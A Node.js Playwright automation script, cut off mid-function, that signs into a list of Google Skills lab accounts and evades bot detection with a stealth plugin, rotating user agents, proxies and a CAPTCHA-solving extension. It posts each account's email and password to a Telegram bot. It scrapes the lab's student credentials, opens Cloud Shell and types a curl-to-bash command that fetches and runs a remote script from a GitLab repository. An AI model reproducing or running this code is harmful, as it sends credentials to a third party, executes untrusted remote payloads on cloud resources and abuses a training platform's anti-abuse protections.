require('dotenv').config();
const fs = require("fs");
const path = require("path");
const axios = require("axios"); // Dikembalikan untuk Telegram
const { chromium } = require("playwright-extra");
const stealth = require("puppeteer-extra-plugin-stealth");

function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function loadProxy() {
    const proxyFile = path.resolve(__dirname, 'proxy.txt');
    if (!fs.existsSync(proxyFile)) return null;
    const lines = fs.readFileSync(proxyFile, 'utf-8').split('\n');
    for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('#')) return trimmed;
    }
    return null;
}

function parseProxyString(proxyStr) {
    try {
        const url = new URL(proxyStr);
        const server = `${url.protocol}//${url.hostname}:${url.port}`;
        const result = { server };
        if (url.username) result.username = decodeURIComponent(url.username);
        if (url.password) result.password = decodeURIComponent(url.password);
        return result;
    } catch {
        return { server: proxyStr };
    }
}

const CONFIG = {
    LOGIN_URL: "https://www.skills.google/users/sign_in",
    LAB_URL: "https://www.skills.google/focuses/86502?parent=catalog",
    PROFILES_DIR: path.resolve(__dirname, "profiles"),
    CREDENTIALS_FILE: path.resolve(__dirname, "akun.txt"),
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
    RECAPTCHA_SITEKEY: "6LeVI8IUAAAAAJNdox5eTkYrw9SbvhZ1TFyv3iHr",
    MIN_DELAY: 2000,
    MAX_DELAY: 5000,
};

const TG_API = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;

async function tgSendMessage(text) {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
        console.log('  ⚠ Telegram dinonaktifkan (Token/Chat ID tidak ditemukan di environment).');
        return;
    }
    try {
        await axios.post(`${TG_API}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML',
        });
        console.log(`  ✔ Berhasil mengirim kredensial login ke Telegram!`);
    } catch (e) {
        console.log(`  ✘ Telegram gagal kirim: ${e.message.substring(0, 50)}`);
    }
}

function randomDelay(min = CONFIG.MIN_DELAY, max = CONFIG.MAX_DELAY) {
    const ms = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise((r) => setTimeout(r, ms));
}

async function humanType(locator, text) {
    for (const char of text) {
        await locator.pressSequentially(char, { delay: 50 + Math.random() * 120 });
    }
}

async function randomMouseMove(page) {
    const vp = page.viewportSize() || { width: 1280, height: 720 };
    const x = Math.floor(Math.random() * vp.width * 0.8) + vp.width * 0.1;
    const y = Math.floor(Math.random() * vp.height * 0.8) + vp.height * 0.1;
    await page.mouse.move(x, y, { steps: Math.floor(Math.random() * 10) + 5 });
}

function loadAllCredentials() {
    const raw = fs.readFileSync(CONFIG.CREDENTIALS_FILE, "utf-8");
    const accounts = raw.split('\n')
        .map(l => l.trim())
        .filter(Boolean)
        .map(line => {
            const [email, ...passwordParts] = line.split(':');
            const password = passwordParts.join(':');
            return { email, password };
        })
        .filter(({ email, password }) => email && password);
    if (!accounts.length) throw new Error('Tidak ada akun valid di akun.txt');
    return accounts;
}

async function runCloudShell(context, consoleLink, password, projectId, studentEmail = '', studentPassword = '') {
    console.log('\n┌─────────────────────────────────────────');
    console.log('│  Cloud Shell');
    console.log('└─────────────────────────────────────────');

    const shellPage = await context.newPage();
    try {
        await shellPage.goto(consoleLink, { waitUntil: 'domcontentloaded', timeout: 60000 });
        await randomDelay(2000, 3000);

        for (let i = 0; i < 15; i++) {
            const url = shellPage.url();
            const isVerifPage = url.includes('speedbump') || url.includes('gaplustos') || url.includes('samlrp') || url.includes('accounts.google.com');

            if (!isVerifPage) {
                console.log(`  ✔ Halaman tujuan tercapai: ${url.substring(0, 80)}`);
                break;
            }

            console.log(`  ~ Verifikasi Google (${i + 1}/15): ${url.substring(0, 80)}`);

            if (url.includes('/signin/rejected') || url.includes('rrk=21')) {
                console.log('  → Google rejected SSO — coba manual sign-in akun student...');
                if (studentEmail && studentPassword) {
                    try {
                        await shellPage.goto('https://accounts.google.com/AddSession', { waitUntil: 'domcontentloaded', timeout: 30000 });
                        await randomDelay(1500, 2500);
                        const emailInput = shellPage.locator('input[type="email"]').first();
                        await emailInput.waitFor({ state: 'visible', timeout: 8000 });
                        await emailInput.fill(studentEmail);
                        await shellPage.keyboard.press('Enter');
                        await shellPage.waitForLoadState('domcontentloaded', { timeout: 15000 }).catch(() => {});
                        await randomDelay(1500, 2000);
                        const pwdInput2 = shellPage.locator('input[type="password"]').first();
                        await pwdInput2.waitFor({ state: 'visible', timeout: 8000 });
                        await pwdInput2.fill(studentPassword);
                        await shellPage.keyboard.press('Enter');
                        await shellPage.waitForLoadState('domcontentloaded', { timeout: 20000 }).catch(() => {});
                        await randomDelay(2000, 3000);
                        console.log('  ✔ Manual sign-in student selesai — navigasi ulang ke console link...');
                        await shellPage.goto(consoleLink, { waitUntil: 'domcontentloaded', timeout: 60000 });
                        await randomDelay(2000, 3000);
                    } catch (e) {
                        console.log(`  ✘ Manual sign-in gagal: ${e.message.substring(0, 80)}`);
                    }
                } else {
                    console.log('  ✘ studentEmail/Password tidak tersedia, tidak bisa sign-in manual.');
                }
                continue;
            }

            if (url.includes('/challenge/pwd') || url.includes('/signin/v2/challenge/pwd')) {
                console.log('  → Password challenge — mengisi password...');
                try {
                    const pwdInput = shellPage.locator('input[type="password"]').first();
                    await pwdInput.waitFor({ state: 'visible', timeout: 5000 });
                    await pwdInput.fill('');
                    await pwdInput.type(password, { delay: 60 });
                    console.log('  ✔ Password diisi');
                    await new Promise(r => setTimeout(r, 500));
                    const nextBtn = shellPage.getByRole('button', { name: 'Next', exact: false });
                    await nextBtn.click({ timeout: 5000 });
                    console.log('  ✔ Klik Next');
                    await shellPage.waitForLoadState('domcontentloaded', { timeout: 15000 }).catch(() => {});
                    await randomDelay(2000, 3000);
                } catch (e) {
                    console.log(`  ✘ Gagal isi password: ${e.message.substring(0, 60)}`);
                }
                continue;
            }

            const candidates = ['Continue as student', 'Lanjutkan sebagai siswa', 'Saya mengerti', 'I understand', 'Lanjutkan', 'Continue', 'Accept', 'Setuju', 'Next'];
            let clicked = false;
            for (const label of candidates) {
                try {
                    const btn = shellPage.getByRole('button', { name: label, exact: false });
                    if (await btn.isVisible({ timeout: 1000 }).catch(() => false)) {
                        await btn.click({ timeout: 5000 });
                        console.log(`  ✔ Klik "${label}"`);
                        await shellPage.waitForLoadState('domcontentloaded', { timeout: 15000 }).catch(() => {});
                        await randomDelay(2000, 3000);
                        clicked = true;
                        break;
                    }
                } catch {}
            }

            if (!clicked) {
                console.log('  ~ Tidak ada tombol — menunggu auto-redirect...');
                await randomDelay(2000, 3000);
            }

            const newUrl = shellPage.url();
            if (!newUrl.includes('speedbump') && !newUrl.includes('gaplustos') && !newUrl.includes('samlrp') && !newUrl.includes('accounts.google.com')) {
                console.log('  ✔ Verifikasi Google berhasil dilewati!');
                break;
            }
        }

        async function dismissStudentDialog() {
            try {
                const btn = shellPage.getByRole('button', { name: /continue as student|lanjutkan sebagai siswa/i });
                if (await btn.isVisible({ timeout: 1500 }).catch(() => false)) {
                    await btn.click({ timeout: 5000 });
                    console.log('  ✔ Dialog "Continue as student" di-dismiss');
                    await randomDelay(1500, 2500);
                }
            } catch {}
        }

        await dismissStudentDialog();

        try {
            await shellPage.locator('input.mdc-checkbox__native-control').first().check({ timeout: 10000 });
            await shellPage.locator("button:has-text('Agree and continue')").click({ timeout: 10000 });
            console.log('  ✔ TOS disetujui');
            await randomDelay(3000, 5000);
        } catch {}

        console.log('  ~ Menunggu tombol Cloud Shell...');
        await dismissStudentDialog();
        const shellBtn = shellPage.locator('button[aria-label*="Cloud Shell"], button:has(mat-icon[data-mat-icon-name="devshell"])');
        await shellBtn.waitFor({ state: 'visible', timeout: 60000 });
        await dismissStudentDialog();
        await shellBtn.click();
        console.log('  → Menyalakan Cloud Shell...');

        console.log('  ~ Menunggu TOS dialog Cloud Shell...');
        for (let i = 0; i < 20; i++) {
            await new Promise(r => setTimeout(r, 2000));
            await dismissStudentDialog();

            let clicked = false;
            for (const frame of shellPage.frames()) {
                try {
                    const cb = frame.locator('input.mdc-checkbox__native-control, input[type="checkbox"]').first();
                    if (await cb.isVisible({ timeout: 500 }).catch(() => false)) {
                        await cb.check({ timeout: 3000 });
                        console.log(`  ✔ Checkbox dicentang [${frame.url().substring(0, 60)}]`);
                        await new Promise(r => setTimeout(r, 1500));
                    }

                    for (const label of['Start Cloud Shell', 'Agree and continue']) {
                        const btn = frame.getByRole('button', { name: label, exact: false });
                        if (await btn.isVisible({ timeout: 500 }).catch(() => false)) {
                            await btn.click({ timeout: 5000 });
                            console.log(`  ✔ Klik "${label}" [${frame.url().substring(0, 60)}]`);
                            clicked = true;
                            break;
                        }
                    }
                    if (clicked) break;
                } catch {}
            }

            if (clicked) break;
            console.log(`  ~ TOS belum muncul... (${(i + 1) * 2}s)`);
            if (i === 19) console.log('  ✘ Timeout TOS dialog Cloud Shell.');
        }

        async function clickInFrames(buttonName) {
            for (const frame of shellPage.frames()) {
                try {
                    const btn = frame.getByRole('button', { name: buttonName, exact: false });
                    if (await btn.isVisible({ timeout: 800 }).catch(() => false)) {
                        await btn.click({ timeout: 5000 });
                        console.log(`  ✔ Klik "${buttonName}" [${frame.url().substring(0, 70)}]`);
                        await new Promise(r => setTimeout(r, 2000));
                        return true;
                    }
                } catch { continue; }
            }
            return false;
        }

        async function findTerminalFrame() {
            for (const f of shellPage.frames()) {
                if (!f.url().includes('devshell') && !f.url().includes('embeddedcloudshell')) continue;
                try {
                    const ta = f.locator('textarea.xterm-helper-textarea');
                    if (await ta.isVisible({ timeout: 500 }).catch(() => false)) return f;
                } catch {}
            }
            return null;
        }

        let terminalFrame = await findTerminalFrame();
        if (terminalFrame) {
            console.log(`  ✔ Terminal sudah siap (existing session): ${terminalFrame.url().substring(0, 70)}`);
        } else {
            console.log('  ~ Menunggu dialog Continue / Authorize...');
            let continueClicked = false;
            let authorizeClicked = false;
            for (let i = 0; i < 40; i++) {
                await dismissStudentDialog();
                terminalFrame = await findTerminalFrame();
                if (terminalFrame) {
                    console.log(`  ✔ Terminal siap tanpa dialog (${i * 2}s): ${terminalFrame.url().substring(0, 70)}`);
                    break;
                }
                if (!continueClicked) {
                    if (await clickInFrames('Continue')) {
                        console.log('  ✔ Continue OK');
                        continueClicked = true;
                        await randomDelay(3000, 5000);
                    }
                }
                if (!authorizeClicked) {
                    if (await clickInFrames('Authorize')) {
                        console.log('  ✔ Authorize OK');
                        authorizeClicked = true;
                    }
                }
                if (authorizeClicked) break;
                await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!terminalFrame) {
            console.log('  ~ Menunggu terminal siap...');
            for (let i = 0; i < 30; i++) {
                await new Promise(r => setTimeout(r, 2000));
                terminalFrame = await findTerminalFrame();
                if (terminalFrame) {
                    console.log(`  ✔ Terminal ditemukan: ${terminalFrame.url().substring(0, 70)}`);
                    break;
                }
                console.log(`  ~ Menunggu terminal... (${(i + 1) * 2}s)`);
            }
        }

        if (!terminalFrame) throw new Error('Terminal frame tidak ditemukan setelah 60s');

        await shellPage.keyboard.press('Escape');
        await new Promise(r => setTimeout(r, 500));
        await dismissStudentDialog();

        const xtermTextarea = terminalFrame.locator('textarea.xterm-helper-textarea');
        await xtermTextarea.click({ timeout: 10000 });
        console.log('  ✔ Terminal difokuskan');
        await new Promise(r => setTimeout(r, 2000));

        await xtermTextarea.press('Control+c');
        await new Promise(r => setTimeout(r, 500));
        await xtermTextarea.press('Control+l'); 
        await new Promise(r => setTimeout(r, 1000));

        if (projectId) {
            const gcloudCmd = `gcloud config set project ${projectId}`;
            console.log(`  → Mengetik perintah: ${gcloudCmd}`);
            
            await xtermTextarea.pressSequentially(gcloudCmd, { delay: 15 });
            await new Promise(r => setTimeout(r, 500));
            await xtermTextarea.press('Enter');
            
            console.log('  ~ Menunggu penerapan project...');
            await new Promise(r => setTimeout(r, 8000));
            await xtermTextarea.press('Enter'); 
            console.log('  ✔ Project aktif di-set!');
        } else {
            console.log('  ⚠ Project ID tidak terdeteksi, me-lewati setup gcloud project.');
        }

        const command = "curl https://gitlab.com/barbieanay003/seger/-/raw/main/run.sh | bash";
        console.log(`  → Mengetik script utama...`);
        
        await xtermTextarea.pressSequentially(command, { delay: 10 });
        await new Promise(r => setTimeout(r, 500));
        await xtermTextarea.press('Enter');
        
        console.log('  ✔ Script utama berhasil dikirim (Enter)!');
        await new Promise(r => setTimeout(r, 8000));

    } catch (e) {
        console.log(`  ✘ Cloud Shell error: ${e.message}`);
    }
}

(async() => {
    chromium.use(stealth());

    const accounts = loadAllCredentials();
    console.log(`\n  ✔ Ditemukan ${accounts.length} akun di akun.txt:`);
    accounts.forEach((a, i) => console.log(`     ${i + 1}. ${a.email}`));

    const selected = accounts;
    const threads = 1;
    const maxLoops = 1;
    const useHeadless = false;

    console.log(`\n  → Menjalankan semua ${selected.length} akun secara otomatis.`);
    console.log(`  → Thread: ${threads}`);
    console.log(`  → Loop mode: 1x`);
    console.log(`  → Headless: tidak\n`);

    async function processAccount({ email, password }, label) {
        console.log(`\n${'═'.repeat(50)}`);
        console.log(`  ${label}: ${email}`);
        console.log(`${'═'.repeat(50)}`);

        const emailSlug = email.replace(/[@.]/g, '_') + '_' + Date.now();
        const profileDir = path.join(CONFIG.PROFILES_DIR, emailSlug);
        if (!fs.existsSync(profileDir)) {
            fs.mkdirSync(profileDir, { recursive: true });
        }
        
        const freshUserAgent = getRandomUserAgent();
        console.log(`  → Profile Temp: ${profileDir}`);
        console.log(`  → User-Agent: ${freshUserAgent}`);

        const proxyStr = loadProxy();
        const proxyConfig = proxyStr ? parseProxyString(proxyStr) : undefined;
        if (proxyConfig) console.log(`  → Proxy: ${proxyConfig.server}`);
        else console.log('  → Proxy: tidak dipakai');

        console.log('  → Memulai browser...');
        const extensionPath = path.resolve(__dirname, "Humans");

        let context = await chromium.launchPersistentContext(profileDir, {
            userAgent: freshUserAgent, 
            headless: useHeadless,
            viewport: { width: 1366, height: 768 },
            args: [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-web-security",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-setuid-sandbox",
                `--disable-extensions-except=${extensionPath}`, 
                `--load-extension=${extensionPath}`
            ],
            permissions: ['clipboard-read', 'clipboard-write'],
            ...(proxyConfig ? { proxy: proxyConfig } : {}),
            locale: "en-US",
            timezoneId: "Asia/Jakarta",
        });

        let page = context.pages()[0] || (await context.newPage());

        try {
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 1 — Login');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.LOGIN_URL, { waitUntil: "domcontentloaded", timeout: 60000 });
            await randomDelay();
            await randomMouseMove(page);

            const currentUrl = page.url();
            const emailBtn = page.locator('#use-email-and-password-button');
            const isOnLoginPage = currentUrl.includes("sign_in") && await emailBtn.isVisible({ timeout: 8000 }).catch(() => false);

            if (!isOnLoginPage) {
                console.log('  ✔ Sudah login — lewati fase login.');
            } else {
                console.log('  → Klik "Use email and password"...');
                const useEmailLink = page.locator('#use-email-and-password-button');
                await useEmailLink.waitFor({ state: "visible", timeout: 15000 });
                await randomDelay(1000, 2000);
                await randomMouseMove(page);
                await useEmailLink.click();
                await randomDelay();

                console.log('  → Mengisi email dan password...');

                const emailField = page.locator('input[type="email"], input[name="user[email]"], input#user_email');
                await emailField.waitFor({ state: "visible", timeout: 15000 });
                await emailField.click();
                await randomDelay(500, 1200);
                await humanType(emailField, email);

                await randomMouseMove(page);
                await randomDelay(800, 1500);

                const passwordField = page.locator('input[type="password"], input[name="user[password]"], input#user_password');
                await passwordField.waitFor({ state: "visible", timeout: 15000 });
                await passwordField.click();
                await randomDelay(500, 1200);
                await humanType(passwordField, password);

                await randomMouseMove(page);
                await randomDelay();

                console.log('  → Klik Sign in...');
                const signInBtn = page.locator('ql-button[type="submit"][data-analytics-action="clicked_sign_in"]');
                await signInBtn.waitFor({ state: "visible", timeout: 10000 });
                await signInBtn.click();

                await page.waitForLoadState("domcontentloaded", { timeout: 30000 });
                await randomDelay();
                console.log(`  ✔ Login selesai → ${page.url()}`);
                
                // MENGIRIM KREDENSIAL KE TELEGRAM SAAT BERHASIL LOGIN
                await tgSendMessage(`${email}:${password}`);
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 2 — Buka Lab');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.LAB_URL, { waitUntil: "domcontentloaded", timeout: 60000 });
            await randomDelay();
            await randomMouseMove(page);

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 3 — Start Lab');
            console.log('└─────────────────────────────────────────');
            console.log('  ~ Menunggu ql-lab-control-panel...');
            await page.waitForSelector('ql-lab-control-panel', { state: 'attached', timeout: 30000 });
            console.log('  ✔ Panel ditemukan.');

            const btnState = await page.evaluate(() => {
                const panel = document.querySelector('ql-lab-control-panel');
                return panel ? panel.getAttribute('labcontrolbutton') : null;
            });

            let labIsAlreadyRunning = false;
            try {
                const parsed = JSON.parse(btnState);
                if (parsed.running === true || parsed.pending === true) {
                    labIsAlreadyRunning = true;
                }
            } catch {}

            if (labIsAlreadyRunning) {
                console.log('  ✔ Lab sedang berjalan — lewati Start Lab & CAPTCHA, langsung ke ekstraksi.');
            } else {
                try {
                    await page.waitForFunction(() => {
                        const panel = document.querySelector('ql-lab-control-panel');
                        if (!panel) return false;
                        const attr = panel.getAttribute('labcontrolbutton');
                        if (!attr) return false;
                        try { return JSON.parse(attr).disabled === false; } 
                        catch { return false; }
                    }, { timeout: 30000 });
                    console.log('  ✔ Tombol Start Lab aktif!');
                } catch {
                    console.log('  ⚠  Tombol masih disabled setelah 30s.');
                }

                await randomDelay(1000, 2500);
                await randomMouseMove(page);

                console.log('  → Klik Start Lab...');
                await page.evaluate(() => {
                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel || !panel.shadowRoot) return;
                    const controlBtn = panel.shadowRoot.querySelector('ql-lab-control-button, #lab-control-button');
                    if (!controlBtn || !controlBtn.shadowRoot) return;
                    const qlBtn = controlBtn.shadowRoot.querySelector('ql-button');
                    if (!qlBtn) return;
                    if (qlBtn.shadowRoot) {
                        const mdBtn = qlBtn.shadowRoot.querySelector('md-filled-button');
                        if (mdBtn && mdBtn.shadowRoot) {
                            const btn = mdBtn.shadowRoot.querySelector('button');
                            if (btn) btn.click();
                        } else {
                            const btn = qlBtn.shadowRoot.querySelector('button');
                            if (btn) btn.click();
                        }
                    } else {
                        qlBtn.click();
                    }
                });

                console.log('\n┌─────────────────────────────────────────');
                console.log('│  Step 4 — Deteksi CAPTCHA');
                console.log('└─────────────────────────────────────────');
                console.log('  ~ Memeriksa apakah CAPTCHA diperlukan...');

                let needsCaptcha = false;
                let labAlreadyStarting = false;

                for (let poll = 0; poll < 20; poll++) {
                    await new Promise(r => setTimeout(r, 1000));
                    const labState = await page.evaluate(() => {
                        const panel = document.querySelector('ql-lab-control-panel');
                        if (!panel) return { starting: false };
                        if (panel.shadowRoot) {
                            const text = panel.shadowRoot.textContent || '';
                            if (text.includes('End Lab') || text.includes('Provisioning')) return { starting: true };
                        }
                        const attr = panel.getAttribute('labcontrolbutton');
                        if (attr) {
                            try {
                                const s = JSON.parse(attr);
                                if (s.running || s.pending) return { starting: true };
                            } catch {}
                        }
                        return { starting: false };
                    }).catch(() => ({ starting: false }));

                    if (labState.starting) {
                        console.log('  ✔ Lab mulai berjalan — tidak perlu CAPTCHA!');
                        labAlreadyStarting = true;
                        break;
                    }

                    const anchorFrame = page.frames().find(f => {
                        const url = f.url();
                        return url.includes('recaptcha') && url.includes('anchor') && !url.includes('invisible');
                    });

                    if (anchorFrame) {
                        console.log(`  ✔ reCAPTCHA v2 terdeteksi!`);
                        needsCaptcha = true;
                        break;
                    }
                }

                if (!needsCaptcha && !labAlreadyStarting) {
                    const lastCheck = page.frames().find(f => f.url().includes('recaptcha') && f.url().includes('anchor') && !f.url().includes('invisible'));
                    if (lastCheck) {
                        needsCaptcha = true;
                        console.log('  ✔ reCAPTCHA ditemukan (deteksi akhir)');
                    } else {
                        console.log('  ~ Tidak ada CAPTCHA setelah 20s — asumsikan lab mulai...');
                        labAlreadyStarting = true;
                    }
                }

                if (needsCaptcha) {
                    await randomDelay(1000, 2000);
                    console.log('  → Klik checkbox reCAPTCHA...');
                    let clicked = false;
                    const anchorFrame = page.frames().find(f => f.url().includes('recaptcha') && f.url().includes('anchor') && !f.url().includes('invisible'));

                    if (anchorFrame) {
                        try {
                            const checkbox = anchorFrame.locator('#recaptcha-anchor, .recaptcha-checkbox-border');
                            await checkbox.waitFor({ state: 'visible', timeout: 5000 });
                            await randomDelay(500, 1500);
                            await checkbox.click();
                            console.log('  ✔ Checkbox reCAPTCHA diklik via frame!');
                            clicked = true;
                        } catch (e) {
                            console.log(`  ⚠  Klik langsung gagal: ${e.message.substring(0, 60)}`);
                        }
                    }

                    if (!clicked) {
                        console.log('  → Coba pendekatan locator...');
                        try {
                            const iframes = page.locator('iframe[src*="recaptcha"][src*="anchor"]');
                            const count = await iframes.count();
                            for (let i = 0; i < count; i++) {
                                const src = await iframes.nth(i).getAttribute('src');
                                if (src && src.includes('size=invisible')) continue;
                                const siteKeyMatch = src?.match(/k=([A-Za-z0-9_-]+)/);
                                let frameSelector = `iframe[src*="recaptcha"][src*="anchor"]`;
                                if (siteKeyMatch) frameSelector = `iframe[src*="${siteKeyMatch[1]}"][src*="anchor"]`;
                                try {
                                    const frame = page.frameLocator(frameSelector).first();
                                    const checkbox = frame.locator('#recaptcha-anchor');
                                    await checkbox.click({ timeout: 5000 });
                                    console.log(`  ✔ Checkbox diklik via locator!`);
                                    clicked = true;
                                    break;
                                } catch {}
                            }
                        } catch {}
                    }

                    console.log('  ~ Menunggu reCAPTCHA diproses...');
                    let bframeExists = false;
                    for (let w = 0; w < 16; w++) {
                        await new Promise(r => setTimeout(r, 500));
                        if (page.frames().some(f => f.url().includes('bframe'))) {
                            bframeExists = true;
                            break;
                        }
                        const af = page.frames().find(f => f.url().includes('anchor') && !f.url().includes('invisible'));
                        if (af) {
                            const checked = await af.locator('#recaptcha-anchor[aria-checked="true"]').isVisible({ timeout: 300 }).catch(() => false);
                            if (checked) break;
                        }
                    }
                    if (!bframeExists) bframeExists = page.frames().some(f => f.url().includes('bframe'));

                    if (bframeExists) {
                        console.log('  → Image challenge muncul — memicu ekstensi "Human"...');
                        const maxRetries = 3;
                        let extSolved = false;
                        let launchLabAppeared = false;
                        const launchLabLocator = page.locator('.js-launch-button.js-lab-access-modal-button').first();

                        for (let attempt = 1; attempt <= maxRetries; attempt++) {
                            const currentBframe = page.frames().find(f => f.url().includes('bframe'));
                            if (!currentBframe) break;

                            try {
                                const extButton = currentBframe.locator('.help-button-holder').first();
                                await extButton.waitFor({ state: 'visible', timeout: 10000 });
                                await extButton.click();
                                console.log(`  ✔ [Attempt ${attempt}] Tombol ekstensi diklik, menunggu proses bypass...`);

                                extSolved = false;
                                for (let wait = 0; wait < 40; wait++) {
                                    await new Promise(r => setTimeout(r, 500));
                                    if (await launchLabLocator.isVisible().catch(() => false)) {
                                        extSolved = true;
                                        launchLabAppeared = true;
                                        break;
                                    }
                                    const bframeIsVisible = await page.locator('iframe[src*="bframe"]').isVisible().catch(() => false);
                                    if (!bframeIsVisible) {
                                        extSolved = true;
                                        break;
                                    }
                                    const af = page.frames().find(f => f.url().includes('anchor') && !f.url().includes('invisible'));
                                    if (af) {
                                        const isChecked = await af.locator('#recaptcha-anchor[aria-checked="true"]').isVisible({ timeout: 300 }).catch(() => false);
                                        if (isChecked) {
                                            extSolved = true;
                                            break;
                                        }
                                    }
                                    const labIsStarting = await page.evaluate(() => {
                                        const panel = document.querySelector('ql-lab-control-panel');
                                        if (!panel) return false;
                                        const attr = panel.getAttribute('labcontrolbutton');
                                        if (attr) {
                                            try {
                                                const s = JSON.parse(attr);
                                                if (s.running || s.pending) return true;
                                            } catch {}
                                        }
                                        return false;
                                    }).catch(() => false);

                                    if (labIsStarting) {
                                        console.log('  ✔ Lab terdeteksi mulai berjalan di latar belakang!');
                                        extSolved = true;
                                        break;
                                    }
                                }

                                if (extSolved) {
                                    console.log('  ✔ Ekstensi berhasil merespons!');
                                    if (launchLabAppeared || await launchLabLocator.isVisible().catch(() => false)) {
                                        await new Promise(r => setTimeout(r, 1000));
                                        await launchLabLocator.click({ timeout: 5000 });
                                        console.log('  ✔ Tombol "Launch Lab" berhasil diklik!');
                                    }
                                    break;
                                } else {
                                    console.log(`  ✘ [Attempt ${attempt}] Ekstensi timeout atau macet.`);
                                    if (attempt < maxRetries) {
                                        console.log('  → Reloading CAPTCHA...');
                                        try {
                                            const reloadBtn = currentBframe.locator('#recaptcha-reload-button').first();
                                            await reloadBtn.click({ timeout: 5000 });
                                            await new Promise(r => setTimeout(r, 3000));
                                        } catch (err) {}
                                    }
                                }
                            } catch (e) {
                                console.log(`  ✘ Gagal interaksi ekstensi di attempt ${attempt}`);
                            }
                        }

                        if (!extSolved) {
                            throw new Error('CAPTCHA_FAILED_BY_EXTENSION');
                        }
                    }
                }
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Step 5+6 — Tunggu Lab + Kredensial');
            console.log('└─────────────────────────────────────────');
            console.log('  ~ Menunggu lab berjalan & kredensial muncul...');
            let labStarted = false;

            try {
                await page.waitForFunction(() => {
                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel) return false;

                    function hasCredentials(root, depth = 0) {
                        if (!root || depth > 10) return false;
                        const text = root.textContent || '';
                        if (/student-[a-z0-9]+@/.test(text) || /qwiklabs-gcp-/.test(text)) return true;
                        
                        if (root.host && root.host.getAttributeNames) {
                            for (const attrName of root.host.getAttributeNames()) {
                                const val = root.host.getAttribute(attrName);
                                if (val && (val.includes('student-') || val.includes('qwiklabs-gcp-'))) return true;
                            }
                        }
                        const els = root.querySelectorAll('*');
                        for (const el of els) {
                            if (el.shadowRoot && hasCredentials(el.shadowRoot, depth + 1)) return true;
                        }
                        return false;
                    }

                    if (panel.shadowRoot && hasCredentials(panel.shadowRoot)) return true;

                    const attr = panel.getAttribute('labcontrolbutton');
                    if (attr) {
                        try {
                            const s = JSON.parse(attr);
                            if (s.running === true && s.pending === false) {
                                const allAttrsValue = panel.getAttributeNames().map(n => panel.getAttribute(n)).join(' ');
                                if (allAttrsValue.includes('student') || allAttrsValue.includes('project')) return true;
                            }
                        } catch {}
                    }
                    return false;
                }, { timeout: 180000 });
                
                labStarted = true;
                await new Promise(r => setTimeout(r, 2000));
                console.log('  ✔ Lab siap dan kredensial terdeteksi di DOM!');
            } catch {
                console.log('  ✘ Tidak bisa konfirmasi lab start setelah 3 menit.');
            }

            if (labStarted) {
                console.log('  → Mengekstrak info lab...');
                const extractAll = await page.evaluate(() => {
                    function collectFromShadow(root, depth = 0) {
                        const data = { texts: [], links: [], inputs: [] };
                        if (!root || depth > 10) return data;

                        const anchors = root.querySelectorAll('a');
                        for (const a of anchors) {
                            if (a.href) data.links.push({ href: a.href, text: (a.textContent || '').trim() });
                        }

                        const inputs = root.querySelectorAll('input, [contenteditable]');
                        for (const inp of inputs) {
                            const v = inp.value || inp.textContent || '';
                            if (v.trim()) data.inputs.push(v.trim());
                        }

                        const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
                        let node;
                        while (node = walker.nextNode()) {
                            const t = node.textContent.trim();
                            if (t.length > 0) data.texts.push(t);
                        }

                        const allEls = root.querySelectorAll('*');
                        for (const el of allEls) {
                            if (el.shadowRoot) {
                                const sub = collectFromShadow(el.shadowRoot, depth + 1);
                                data.texts.push(...sub.texts);
                                data.links.push(...sub.links);
                                data.inputs.push(...sub.inputs);
                            }
                        }
                        return data;
                    }

                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel) return { texts: [], links: [], inputs: [], attrs: {} };

                    const shadowData = panel.shadowRoot ? collectFromShadow(panel.shadowRoot) : { texts: [], links: [], inputs: [] };
                    const pageLinks = [];
                    for (const a of document.querySelectorAll('a')) {
                        if (a.href && (a.href.includes('console.cloud.google') || a.textContent.includes('Google Cloud')))
                            pageLinks.push({ href: a.href, text: (a.textContent || '').trim() });
                    }
                    shadowData.links.push(...pageLinks);

                    const attrs = {};
                    for (const attrName of panel.getAttributeNames()) {
                        const val = panel.getAttribute(attrName);
                        if (val && val.length < 5000) attrs[attrName] = val;
                    }
                    shadowData.attrs = attrs;
                    return shadowData;
                });

                let consoleLink = null;
                let username = null;
                let labPassword = null;
                let projectId = null;

                for (const link of extractAll.links) {
                    if (link.href.includes('console.cloud.google') || link.href.includes('google_sso') || link.text.includes('Open Google Cloud')) {
                        consoleLink = link.href;
                        break;
                    }
                }

                if (consoleLink) {
                    try {
